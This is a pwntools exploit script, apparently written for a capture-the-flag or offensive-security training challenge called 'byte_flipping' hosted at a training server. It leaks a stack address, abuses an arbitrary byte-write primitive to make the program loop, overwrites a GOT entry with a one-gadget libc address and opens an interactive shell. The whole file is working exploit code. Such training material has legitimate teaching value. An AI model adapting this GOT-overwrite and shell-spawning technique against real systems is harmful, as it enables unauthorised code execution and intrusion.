from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']


to_rop = 0xebcf1 

if "REMOTE" not in args:
    if "NORMAL" not in args:
        r = process("./byte_flipping")
        gdb.attach(r, """
        #b* 0x004008d8
        b * 0x400804   
        b*  0x400809 
        b* 0x0400aad
        #b* 0x00400a09  
        """)
    else:
        r = process("./byte_flipping")    
else:
    r = remote("bin.training.offdef.it", 2015)


def sendata(add, value):
    print(b"RECEIVED" + r.recvuntil(b"Address: ") + b"PRIMA REC")
    address = b"%#x" % add
    print(address)
    r.sendline(address)
    print(b"RECEIVED" + r.recvuntil(b"Value: ")+ b"SECONDA REC")
    r.sendline((b"%#x" % value))
    print("sent %#x" %value)
    #print(r.recvline())

def write_add(base, value):
    for i in range(4):
        index = i * 2
        sendata(cycle_target, 0x04)
        sendata(base+index, value%0x100)
        value -= value%0x100
        value = int(value/0x100)
        sendata(base+index+1, value%0x100)
        value -= value%0x100
        value = int(value/0x100)

def write_add2(base, value):
    for i in range(2):
        index = i * 2
        sendata(base+index, value%0x100)
        #sendata(base+index, value%0x100)
        value -= value%0x100
        value = int(value/0x100)
        sendata(base+index+1, value%0x100)
        value -= value%0x100
        value = int(value/0x100)


r.recvuntil(b": ")
r.send(b"A"*32)
r.recvuntil(b"luck ")
leak = r.read(32)
leak = r.read(6) + b"\x00\x00"

reference_leak = 0x7ffe22ef0fc0
reference_saved_IP = 0x7ffe22ef0ff8

# rop_offset = 0x7ffe06d319f0 - 0x7ffe06d31a38
# rop_target = u64(leak) + rop_offset
got = 0x602028
0x0602068

libc_puts = 0x680ed0
libc_base = 0x628000
puts_offset = libc_puts - libc_base

cycle_offset = reference_saved_IP - reference_leak
cycle_target = u64(leak) + cycle_offset
rop_target = cycle_target + 0x10




input("wait")
sendata(cycle_target, 0x04)
sendata(cycle_target, 0x04)
sendata(cycle_target, 0x04)
#sendata(0x0602068, 0x03)
input("wait")
write_add(got,(to_rop+0xc60770))

r.interactive()